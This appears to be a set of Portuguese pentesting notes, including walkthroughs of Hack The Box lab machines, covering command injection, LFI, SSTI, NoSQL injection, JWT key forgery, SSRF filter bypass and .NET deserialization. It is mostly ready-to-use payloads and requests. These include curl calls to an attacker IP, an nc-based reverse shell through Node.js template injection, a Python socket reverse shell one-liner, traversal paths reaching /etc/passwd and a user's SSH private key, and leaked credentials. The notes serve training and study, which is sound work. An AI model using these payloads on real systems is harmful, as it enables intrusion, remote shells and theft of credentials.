# Web

- Injeção de commando
    
    `$(id)`
    
    `host=test&username=$(IFS=_;command='curl_http://10.10.14.120:4444';$command)`
    
- LFI
    
    Procurar os ficheiros
    
    HTTP Request
    
    ```bash
    GET /index.php?page=**php://filter/convert.base64-encode/resource=db_connect** HTTP/1.1
    ```
    
    HTTP Response
    
    ```bash
    Procurar na resposta em base 64 
    PD9waHAgDQoNCiRjb25uPSBuZXcgbXlzcWxpKCdsb2NhbGhvc3QnLCdyZW1vJywnVHJ1bHlJbXBvc3NpYmxlUGFzc3dvcmRMbWFvMTIzJywncGF5cm9sbF9kYicpb3IgZGllKCJDb3VsZCBub3QgY29ubmVjdCB0byBteXNxbCIubXlzcWxpX2Vycm9yKCRjb24pKTsNCg0K
    ```
    
    HTTP Request
    
    ```bash
    GET /index.php?page=../../../../file
    caso ele devolva o ficheiro em questão mesmo com File Path, provavelmente tem um filtro "../" 
    
    GET /index.php?page=../../../../etc/passwd
    GET /index.php?page=....//....//....//....//home/michael/.ssh/id_rsa
    ```
    
- SSTI
    
    [A Pentester’s Guide to Server Side Template Injection (SSTI) | Cobalt](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
    
    [PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
    
    [SSTI (Server Side Template Injection) - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#exploits)
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled.png)
    
    Nodjs
    
    ```bash
    {{7*7}}@htb.eu
    *{8*8}
    
    {{range.constructor(\"return
    global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}
    {{range.constructor(\"return
    global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo
    /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 4444 >/tmp/f')\")()}}
    ```
    
- NoSql
    
    Injection
    
    `user’||’1’==’1`
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%201.png)
    
    Request
    
    `Content-Type: application/json`
    
    `{"username":"wiener","password":"peter"}`
    
    `{"username":{"$ne":"invalid"},"password":{"peter"}}`
    
- mPDF
    
    Este programa é gerado ao criar em pdf, canto direito da pagina.
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%202.png)
    
    A variavel pdf esta codificada como base64 e 2 vezes urlencoded,
    
    ```
     POST /admin/download.php HTTP/1.1
    Host: faculty.htb
    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 292
    Origin: http://faculty.htb
    DNT: 1
    Connection: close
    Referer: http://faculty.htb/admin/index.php?page=subjects
    Cookie: PHPSESSID=264ih4j8aec14lqd9jj3sko2q0
    Sec-GPC: 1
    
    pdf=JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyZGJfY29ubmVjdC5waHAlMjUyMiUyNTIwY29udGVudD0lMjUyMmRiX2Nvbm5lY3QucGhwJTI1MjIlMjUyMCUyNTIwaWNvbj0lMjUyMkdyYXBoJTI1MjIlMjUyMHRpdGxlPSUyNTIyQXR0YWNoZWQlMjUyMEZpbGU6JTI1MjBkYl9jb25uZWN0LnBocCUyNTIyJTI1MjBwb3MteD0lMjUyMjE5NSUyNTIyJTI1MjAvJTI1M0UlMjUwQQ==
    ```
    
    Para ajudar a descodificar sutilizamos o cyberchef 
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%203.png)
    
    Como o mpdf é open source, vamos investigar as possíveis vulns  
    
    [https://github.com/mpdf/mpdf/issues/356](https://github.com/mpdf/mpdf/issues/356)
    
    Depois, como esta na imagem acima, encodificamos e depois utilizamos o repeater do burp p para mandar o pedido, acima indicado. Fazemos o download com o wget.
    
    `wget http://faculty.htb/mpdf/tmp/OKvzIgJpd3M6mcBQwUA0oPsZn1.pdf`
    
- Insecure
    
    Request
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%204.png)
    
    ```
    POST /upload HTTP/1.1
    Host: forge.htb
    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 20
    Origin: http://forge.htb
    DNT: 1
    Connection: close
    Referer: http://forge.htb/upload
    Upgrade-Insecure-Requests: 1
    Sec-GPC: 1
    
    url=bsfsdfa&remote=1
    ```
    
    Encima podemos notar que temos uma variavel que podemos explorar potenciais injeções de codigo.
    
    Utilizando o curl -v conseguimos ver a pagina.
    
    ```
    └──╼ [★]$ curl http://forge.htb/uploads/4qM3IiaOH9fVJ7aej2N1 -v
    *   Trying 10.129.34.169:80...
    * Connected to forge.htb (10.129.34.169) port 80 (#0)
    > GET /uploads/4qM3IiaOH9fVJ7aej2N1 HTTP/1.1
    > Host: forge.htb
    > User-Agent: curl/7.88.1
    > Accept: */*
    > 
    < HTTP/1.1 200 OK
    < Date: Tue, 09 Jan 2024 18:31:31 GMT
    < Server: Apache/2.4.41 (Ubuntu)
    < Content-Disposition: inline; filename=4qM3IiaOH9fVJ7aej2N1
    < Content-Length: 965
    < Last-Modified: Tue, 09 Jan 2024 18:31:15 GMT
    < Cache-Control: no-cache
    < Content-Type: image/jpg
    < 
    <!DOCTYPE html>
    <html>
    <head>
        <title>Announcements</title>
    </head>
    <body>
        <link rel="stylesheet" type="text/css" href="/static/css/main.css">
        <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
        <header>
                <nav>
                    <h1 class=""><a href="/">Portal home</a></h1>
                    <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                    <h1 class="align-right"><a href="/upload">Upload image</a></h1>
                </nav>
        </header>
        <br><br><br>
        <ul>
            <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
            <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
            <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
        </ul>
    </body>
    * Connection #0 to host forge.htb left intact
    ```
    
    Apos ler o conteúdo, percebe se que temos credenciais de acesso ao serviço ftp
    
    `http://aDmin.Forge.Htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/`
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%205.png)
    
    Nota: Para conseguir com que o site responda e não seja bloqueado, temos de colocar algumas letras em maiúsculo para tentar passar esta restrição. 
    
    Apos testar isto no site, 
    
    Assim já foi possível conseguir passar a blacklist 
    
    ```
    HTTP/1.1 301 MOVED PERMANENTLY
    Location: http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/
    ```
    
    Depois damos este script ao nc 
    
    `nc -nlvp 9001 < req`
    
    Coloca se o endereço da nossa maquina e porta. 
    
    ```
    curl http://forge.htb/uploads/oyi7LCfffFdysnDKDbS1 
    drwxr-xr-x    3 1000     1000         4096 Aug 04  2021 snap
    -rw-r-----    1 0        1000           33 Jan 09 17:13 user.txt
    * Connection #0 to host forge.htb left intact
    ```
    
- JWT coockie
    
    JWT coockie
    
    ```
    eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5L
    mtleSJ9.eyJ1c2VybmFtZSI6InBhdWxvIiwiZW1haWwiOiJwYXVsb0BwYXVsby5wdCIsImFkbWluX2NhcCI6
    MH0.CLPuTnWGTKSOEl1JfQDn9woKSoNLffHYn3ZiBs8p3dXynTJaMXKH28yUUtvNHqxrM-8uFk5vMnCUS3q6
    iCqUqKrb5IMIIUuMq4f1gqjckf5Z7v66HsbDNNqtcZ6tn8KQfaAFY8YjdqZhg97KSEhppiSX_3x7A78scdkN
    bgVOlzauCcDVpIy5L0jgA7f5b_N8K-UnqQ5vzwH41XTGDy2qaIhmopCAa6lj52GxIeOdy73R69PF6WpxDBBL
    sCoP1qpMYr-_eSSgVXc_apOBBHqS0HcH21KdTNr5nEw6U0Wmopo1Z_Eb1awOXutLk7h9JKPlpRU2FCukNABx
    svmkAkOzWDrOE1MfV_skZhD4SeHz5RZI4HnK3HIbXxZU9RLnTjhKw8G9BSdx0KqCdltQK-0gWFPWqNqJbm6H
    C4TrRgnDUNDGaKM3_LSUHefOY9WXbQXkGjlWR5eIbtx4FDdnrHeRwwdpRfRTeusIgZx7KWNLl4kNuwqN38bj
    v65ZXfL9RPUrb1NyCawn_epa9K5vdlMlEjoXaUmW1lFrDwNiQQQ6ctY__l7bQOvQbR81H_-kYnRAEWfJsFH_
    oQ9XYm_HZNlP3XURkHXoCYW4-l6A99djdnhz0Aw2m_52ODXgj33j4IYNu2fKWZUHjTcApA9mYoB3eehwBYzz
    8eVwm7PaXfXHC0E
    ```
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%206.png)
    
    jwt.header
    
    ```
    {"typ":"JWT","alg":"RS256","kid":"http://localhost:7070/privKey.key"}
    
    nano jwt.header
    {"typ":"JWT","alg":"RS256","kid":"http://10.10.14.83:7070/privKey.key"}
    
    base64 jwt.header -w 0
    eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC44Mzo3MDcwL3ByaXZLZXkua2V5In0K
    ```
    
    Copiar esta parte inicial da cookie para o [JWT.io](http://JWT.io)  
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%207.png)
    
    Agora é preciso gerar os certificados 
    
    ```
    ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key
    
    openssl rsa -in privKey.key -pubout -outform PEM -out privKey.key.pub
    writing RSA key
    ```
    
    Copiar o conteudo dos certificados privKey.key e privKey.key.pub para o site e alterar admin_cap=1
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%208.png)
    
    A seguir copiar a cookie para o site 
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%209.png)
    
    Colocar um server para o site conseguir obter o certificado
    
    `python -m http.server 7070`
    
- BadHttpServer
    
    O Nmap mostra que o SSH está disponível na sua porta padrão, bem como um servidor web chamado BadHTTPServer na porta 8080, que serve uma página intitulada Obscura. A inspeção dessa página em um navegador revela um site para uma empresa de software focada em segurança. Sua suíte de produtos inclui o servidor web BadHTTPServer, um algoritmo de criptografia e uma substituição para o SSH.
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2010.png)
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2011.png)
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2012.png)
    
    ```bash
    wget -L
    github.com/ffuf/ffuf/releases/download/v1.0.2/ffuf_1.0.2_linux_amd64.tar.gz
    mkdir ffuf
    tar -xzf ffuf_1.0.2_linux_amd64.tar.gz -C ffuf
    ./ffuf -w /usr/share/dirb/wordlists/common.txt -u
    http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -mc 200
    ```
    
    Após fazer o download e extrair, o ffuf é executado com a wordlist comum dirb.txt. Como estamos incluindo o nome do arquivo e esperamos obter uma resposta HTTP 200, podemos filtrar usando a opção -mc
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2013.png)
    
    A função serveDoc contém alguns comentários. Parece que o programador introduziu involuntariamente uma vulnerabilidade de injeção, uma vez que o URL controlado pelo utilizador é passado para o exec .
    
    ```python
      		def serveDoc(self, path, docRoot):
    		      path = urllib.parse.unquote(path)
    try:
    	info = "output = 'Document: {}'" # Keep the output for later debug
    	exec(info.format(path)) # This is how you do string formatting,right?
    ```
    
    Vamos montar o servidor localmente e validar a vulnerabilidade. Primeiro, vamos criar a estrutura de ficheiros esperada pelo servidor Web.
    
    `mkdir -p DocRoot/errors`
    `touch DocRoot/errors/404.html`
    `echo test > DocRoot/index.html`
    
    Em seguida, precisamos de editar o ficheiro para produzir o URL solicitado e para configurar um socket para ouvir.
    
    ```python
    # add above exec(info.format(path))
    print(info.format(path))
    #append to SuperSecureServer.py
    s = Server ("127.0.0.1", 8080)
    s.listen ()
    #start server
    python3 SuperSecureServer.py
    ```
    
    Depois de iniciar o servidor Web, podemos fazer experiências com diferentes pedidos.
    
    ```python
    request: http://127.0.0.1:8080/
    output: output = 'Document: /'
    ```
    
    Também visto no código, o URL está contido em duas aspas simples. Como a biblioteca os já está importada, podemos tentar executar um comando do sistema.
    
    ```python
    request: http://127.0.0.1:8080/';os.system('id');
    output:
    output = 'Document: /';os.system('id');'
    EOL while scanning string literal (<string>, line 1)
    ```
    
    No entanto, se as aspas simples não estiverem equilibradas, isso resultará num erro. Esta situação foi corrigida e conseguimos validar a vulnerabilidade de injeção e obter a execução do comando.
    
    ```python
    request: http://127.0.0.1:8080/';os.system('id');'
    output:
    output = 'Document: /';os.system('id');''
    uid=0(root) gid=0(root) groups=0(root)
    ```
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2014.png)
    
    Vamos tentar replicar isso no sistema real. Como não temos acesso à consola, podemos tentar enviar a nós próprios dois pedidos ICMP.
    
    `tcpdump -i tun0 icmp`
    [`http://10.10.10.168:8080/';os.system('ping](http://10.10.10.168:8080/';os.system('ping) -c 2 10.10.14.3');'`
    
    Conseguimos executar o comando do servidor com sucesso. Podemos tentar extrair a saída básica do servidor através de HTTP, examinando o URL solicitado nos registos do nosso servidor Web.
    
    ```python
    #stand up web server locally
    python3 -m http.server 80
    request:
    http://10.10.10.168:8080/';os.system('curl%20http://10.10.14.3/$(hostname)');'
    ```
    
    Vamos obter uma shell no servidor usando um one-liner Python.
    
    [`http://10.10.10.168:8080/](http://10.10.10.168:8080/)';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.
    connect(("10.10.14.3",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2015.png)
    
- Ransom
    
    Enumeration
    
    ```python
    nmap -p$ports -sC -sV 10.129.227.93
    22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
    | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
    |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
    80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
    | http-title: Admin - HTML5 Admin Template
    |_Requested resource was http://10.129.227.93/login
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    ```
    
    A saída do Nmap revela duas portas abertas. Na porta 22 está a correr um servidor SSH, na porta 80 um servidor web Apache. Como nós não temos, atualmente, nenhuma credencial SSH válida, nós devemos começar nossa enumeração visitando a porta 80.
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2016.png)
    
    Interagir com o campo da palavra-passe e tentar algumas palavras-passe comuns como `admin` , `password123` etc. e técnicas simples de injeção de SQL como ' ou `1=1-- -1` não produz resultados válidos. Notamos, no entanto, que cada vez que clicamos no botão Login, a página não é totalmente recarregada. Em vez disso, o JavaScript está enviando uma solicitação de validação de senha para /api/login.
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2017.png)
    
    Notamos que o pedido é um pedido GET. Vamos usar o BurpSuite para intercetar esse pedido e adulterá-lo. Por exemplo, podemos alterá-lo para um pedido POST clicando com o botão direito do rato e selecionando Alterar método de pedido, depois de o transferir para o separador Repetidor (Ctrl + r).
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2018.png)
    
    Há uma mensagem de erro, informando-nos de que apenas os métodos de pedido GET e HEAD são permitidos neste ponto final. Podemos tentar alterar manualmente a palavra POST para GET e deixar o parâmetro password no corpo do pedido.
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2019.png)
    
    Desta vez, recebemos um erro de que o campo da palavra-passe não foi encontrado. Para uma solicitação GET, faz sentido que o ponto de extremidade não processe dados no corpo da solicitação. Mas, vamos tentar modificar o cabeçalho ContentType para application/json e modificar o formato dos dados para JSON, para corresponder ao formato dos dados da resposta.
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2020.png)
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2021.png)
    
    Finalmente, conseguimos enviar uma solicitação válida e processar os dados no corpo da solicitação usando uma solicitação GET. A vantagem de ter os dados em formato JSON é que alargámos a nossa superfície de ataque. Mais especificamente, podemos tentar fazer malabarismos de tipo. Podemos substituir a cadeia de caracteres da palavra-passe pela palavra-chave true, por exemplo:
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2022.png)
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2023.png)
    
    Parece que o ataque funcionou e agora podemos aceder à página Web.
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2024.png)
    
- WS
    
    Enumeratio
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2025.png)
    
    3 portos abertos, 22 ssh, 5000 upnp e 8000 http
    
    HTTP
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2026.png)
    
    Com base na nossa observação, o sítio Web parece ser maioritariamente estático, o que significa que o conteúdo do sítio Web não muda muito.
    A página de encomendas parece conter apenas um diretoria que lista as encomendas
    
    `curl [http://bagel.htb:8000/orders](http://bagel.htb:8000/orders)`
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2027.png)
    
    Alternando entre as duas páginas, nomeadamente home , e orders , notamos que existe um parâmetro chamado
    page no URL. Especificamente, a estrutura do URL que observamos é `/?page=index.html` .
    Ao inspecionar o sítio Web, verificamos que o parâmetro ?page= é utilizado para especificar o ficheiro acedido. Para explorar a possibilidade de escapar ao diretório atual e localizar ficheiros intrigantes adicionais explorando vulnerabilidades de passagem de caminho, podemos tentar um ataque de inclusão de ficheiros locais (LFI).
    Testamos a nossa hipótese interceptando um pedido no `BurpSuite` e enviando-o para a ferramenta Repeater. Em seguida, modificamos o parâmetro da página para aceder ao ficheiro passwd localmente no sistema, utilizando uma sequência de
    `../ .`
    
    `GET /?page=../../../../../../etc/passwd HTTP/1.1`
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2028.png)
    
    As nossas suspeitas são confirmadas e podemos ler com sucesso os ficheiros no sistema alvo. Ao mesmo tempo, também identificámos dois utilizadores presentes na máquina, nomeadamente developer e phil . Prosseguimos com a procura de ficheiros interessantes no sistema alvo.
    O ficheiro `/proc/<PID>/cmdline` contém os argumentos da linha de comandos que foram passados ao processo com o ID de processo dado ( PID ). Neste caso, em que não sabemos o PID da aplicação web, podemos usar self para nos referirmos ao processo atual, pelo que a leitura de `/proc/self/cmdline` nos mostrará quais os argumentos que foram passados à aplicação web, caso existam.
    O conteúdo do arquivo é uma lista de strings separadas por zero que representam os argumentos da linha de comando. Nós migramos do BurpSuite para o cURL para exibir diretamente o conteúdo dos arquivos acessados em nosso shell.
    
    `curl [http://bagel.htb:8000/?page=../../../../../../../proc/self/cmdline](http://bagel.htb:8000/?page=../../../../../../../proc/self/cmdline) -o -`
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2029.png)
    
    O resultado indica que a aplicação Web é um script Python localizado em `/home/developer/app/app.py`.
    
    `curl [http://bagel.htb:8000/?page=../../../../../home/developer/app/app.py](http://bagel.htb:8000/?page=../../../../../home/developer/app/app.py)`
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2030.png)
    
    A aplicação web utiliza Flask , uma estrutura web Python, e consiste em duas rotas:
    
    1. A rota `/` serve ficheiros da pasta static/ com base no parâmetro de página incluído no URL.
    Se o ficheiro pedido existir, é servido utilizando a função send_file do Flask; caso contrário, a resposta é "Ficheiro não encontrado". Se o parâmetro de página não for fornecido, o utilizador é redireccionado para o URL [`http://bagel.htb:8000/?page=index.html`](http://bagel.htb:8000/?page=index.html).
    2. A rota /orders se conecta a um servidor WebSocket em execução na mesma máquina em `ws://127.0.0.1:5000/` . A aplicação envia uma mensagem JSON para o servidor com a instrução de ler o ficheiro orders.txt. Se a ligação for bem sucedida, o conteúdo de orders.txt é devolvido; caso contrário, é apresentada a mensagem `"Unable to connect"`.
    O código também importa as bibliotecas necessárias: `Flask` , `request` , `send_file` , `redirect` , Response do Flask , os.path do Python , e as bibliotecas WebSocket e json. Em seguida, ele executa o aplicativo na porta 8000 do host local.
    
    Curiosamente, o código contém um comentário que instrui o utilizador a executar primeiro a aplicação de encomenda utilizando o comando dotnet <caminho para .dll>. Ele também sugere o uso de uma chave SSH para obter acesso à máquina.
    Notamos que pelo menos um dos usuários provavelmente tem uma chave SSH privada dentro de seus diretórios pessoais, que poderíamos usar para obter um ponto de apoio na máquina.
    A nossa tarefa agora é encontrar um método para obter o ficheiro .dll mencionado através da travessia do caminho. No entanto, não temos qualquer informação sobre o nome ou a localização do ficheiro.
    Sabemos, no entanto, que ele é operado com o programa " dotnet ". Como resultado, devemos tentar examinar sistematicamente ficheiros como /proc/<PID>/cmdline que possam conter a palavra-chave "dotnet", usando força bruta.
    Utilizamos o wfuzz para efetuar um ataque de força bruta para encontrar o PID de um processo .NET em execução no servidor de destino
    servidor alvo.
    
    `wfuzz -z range,1-30000 --ss dotnet -u "[http://bagel.htb:8000/](http://bagel.htb:8000/)?page=../../../../../proc/FUZZ/cmdline"`
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2031.png)
    
    O comando tenta aceder ao ficheiro `/proc/FUZZ/cmdline` no servidor, substituindo "FUZZ" por números que variam de `1 a 30000`. Está à procura de um ficheiro que contenha a palavra dotnet , que será provavelmente o ficheiro .dll que está a ser executado no servidor. A saída mostra os resultados do comando, incluindo o código de resposta (200 significa sucesso), o número de linhas, palavras e caracteres na resposta e a carga útil que foi usada para gerar a resposta. Obtemos uma matriz de processos contendo a palavra-chave dotnet e tentamos acessá-los, começando com o primeiro, nomeadamente o processo 893.
    
    `curl [http://bagel.htb:8000/?page=../../../../../proc/893/cmdline](http://bagel.htb:8000/?page=../../../../../proc/893/cmdline) --output -`
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2032.png)
    
    Com base na nossa força bruta de passagem de caminho, descobrimos com êxito o caminho para o ficheiro .dll que está a ser executado pelo programa dotnet. O caminho é `/opt/bagel/bin/Debug/net6.0/bagel.dll`. Vamos proceder ao download do ficheiro para a nossa máquina local
    
    `curl [http://bagel.htb:8000/?page=../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll](http://bagel.htb:8000/?page=../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll) --
    output bagel.dll`
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2033.png)
    
    O resultado indica que o ficheiro é um executável PE32, concebido para a arquitetura Intel 80386. É também é identificado como um assembly Mono/.Net destinado a ser executado no sistema operativo Microsoft Windows.
    
    Bagel Source Code Review
    
    Uma vez que estamos a lidar com um ficheiro DLL, passamos para um ambiente Windows e abrimo-lo utilizando o depurador dnSpy onde observamos que ele contém cinco classes e aproximadamente 190 linhas de código. Para começar nossa análise, navegamos até a classe Bagel.
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2034.png)
    
    Analisando o código das linhas 25 a 42, vemos dois métodos estáticos privados:
    
    ```python
    // Token: 0x06000009 RID: 9 RVA: 0x00002134 File Offset: 0x00000334
     private static void InitializeServer()
     {
     Bagel._Server = new WatsonWsServer(Bagel._ServerIp, Bagel._ServerPort,
    Bagel._Ssl);
     Bagel._Server.AcceptInvalidCertificates = true;
     Bagel._Server.MessageReceived += Bagel.MessageReceived;
     }
    // Token: 0x0600000A RID: 10 RVA: 0x00002174 File Offset: 0x00000374
     [DebuggerStepThrough]
     private static void StartServer()
     {
     Bagel.<StartServer>d__6 <StartServer>d__ = new Bagel.<StartServer>d__6();
     <StartServer>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
     <StartServer>d__.<>1__state = -1;
     <StartServer>d__.<>t__builder.Start<Bagel.<StartServer>d__6>(ref
    <StartServer>d__);
     }
    
    ```
    
    O WatsonWsServer no primeiro método, `InitializeServer()` , é uma instância da biblioteca WatsonWebsocket, que permite a construção de servidores e clientes WebSocket. Neste caso, está a inicializar um novo servidor com o endereço IP, número de porta e parâmetros SSL fornecidos. O servidor também é configurado para aceitar certificados inválidos, e um manipulador de eventos `MessageReceived` é adicionado. 
    
    O segundo método, `StartServer()` , usa um `AsyncVoidMethodBuilder` para criar e iniciar uma nova tarefa da classe `\<StartServer>d__6`. Esse método significa o início do servidor WebSocket e o início de suas operações.
    
    ```python
    // Token: 0x0600000B RID: 11 RVA: 0x000021A8 File Offset: 0x000003A8
     private static void MessageReceived(object sender, MessageReceivedEventArgs args)
     {
     string json = "";
     bool flag = args.Data != null && args.Data.Count > 0;
     if (flag)
     {
     json = Encoding.UTF8.GetString(args.Data.Array, 0, args.Data.Count);
     }
     Handler handler = new Handler();
     object obj = handler.Deserialize(json);
     object obj2 = handler.Serialize(obj);
     Bagel._Server.SendAsync(args.IpPort, obj2.ToString(),
    default(CancellationToken));
     }
    ```
    
    Este código define um método chamado `MessageReceived` que é utilizado como um manipulador de eventos para o evento MessageReceived da classe `WatsonWsServer`.
    Quando uma mensagem é recebida pelo servidor, este método é chamado e recupera o seu conteúdo (em formato JSON) dos argumentos do evento. Em seguida, ele desserializa o objeto JSON em um objeto C# usando uma instância da classe `Handler` e, em seguida, serializa-o novamente no formato JSON.
    Por fim, o JSON serializado é enviado de volta para o cliente usando o método `SendAsync` da instância do WatsonWsServer.
    Este segmento de código parece apresentar uma potencial vulnerabilidade relacionada com a desserialização insegura, que iremos investigar mais aprofundada nas secções seguintes.
    
    DB
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2035.png)
    
    Lemos que a classe ainda não está totalmente implementada, uma vez que a base de dados ainda não foi configurada. No entanto, uma palavra-passe em texto simples, `k8wdAYYKyhnjg3K` , é revelada, bem como o ID `dev` . A tentativa de fazer SSH na máquina com as credenciais obtidas não funciona, por isso guardamo-las para uso posterior.
    
    Handler
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2036.png)
    
    Este código define um método chamado Deserialize que recebe um parâmetro de cadeia de caracteres, json , como entrada e devolve um objeto.
    O método primeiro tenta desserializar a string json em um objeto do tipo Base usando o método `JsonConvert.DeserializeObject` da biblioteca `Newtonsoft.Json`. Crucialmente, ele define a configuração `TypeNameHandling` como 4 . 
    
    De acordo com a documentação sobre `TypeNameHandling` , essa configuração garante que os dados JSON serializados contenham o nome do tipo `.NET` quando o tipo de objeto real não corresponder ao tipo declarado.
    No contexto do código, isso significa que, quando a cadeia de caracteres json for desserializada, o serializador incluirá as informações de tipo nos dados JSON serializados, permitindo que o desserializador infira o tipo de objeto correto.
    Esse comportamento é particularmente importante no contexto de uma possível exploração, pois introduz a possibilidade de ataques de desserialização polimórficos. 
    
    No entanto, vale a pena notar que, por padrão, o objeto serializado raiz não é incluído nas informações de tipo. Portanto, para explorar possíveis vulnerabilidades relacionadas à desserialização insegura, torna-se necessário especificar explicitamente um objeto de tipo raiz para inclusão na serialização JSON.
    
    Se a desserialização for bem sucedida, o método devolve o objeto desserializado. Caso contrário, se for lançada uma exceção durante a desserialização, o método devolve uma cadeia de caracteres JSON com a mensagem "desconhecido".
    
    Base
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2037.png)
    
    A classe Base no espaço de nomes `bagel_server` herda da classe Orders e tem três propriedades: `UserId` , `Session` , e `Time`.
    As propriedades `UserId` e `Session` são propriedades getter/setter simples que permitem à classe armazenar e recuperar dois campos privados: um ID de utilizador inteiro e um valor de sessão de cadeia de caracteres. A propriedade Time é uma propriedade só de leitura que devolve a hora atual como uma cadeia de caracteres no formato `h:mm:ss`. 
    
    Finalmente, a classe é marcada com os atributos `[NullableContext(1)]` e `[Nullable(0)]`, que indicam que são permitidos valores nulos para tipos de referência dentro da classe.
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2038.png)
    
    A classe Orders do espaço de nomes `bagel_server` contém três propriedades:
    
    1. `RemoveOrder` : uma propriedade pública do tipo object , com métodos get e set.
    2. `WriteOrder` : uma propriedade pública do tipo string . O método get devolve a propriedade `WriteFile` de
    uma instância da classe File, e o método set define a propriedade `WriteFile` da mesma
    instância para o valor dado.
    3. `ReadOrder` : uma propriedade pública do tipo string . O método get devolve a propriedade ReadFile de uma instância da classe File. O método set, no entanto, primeiro higieniza a entrada substituindo `"/"` e `"..."` por `""`, antes de definir a propriedade `ReadFile` da mesma instância para o valor dado.
    
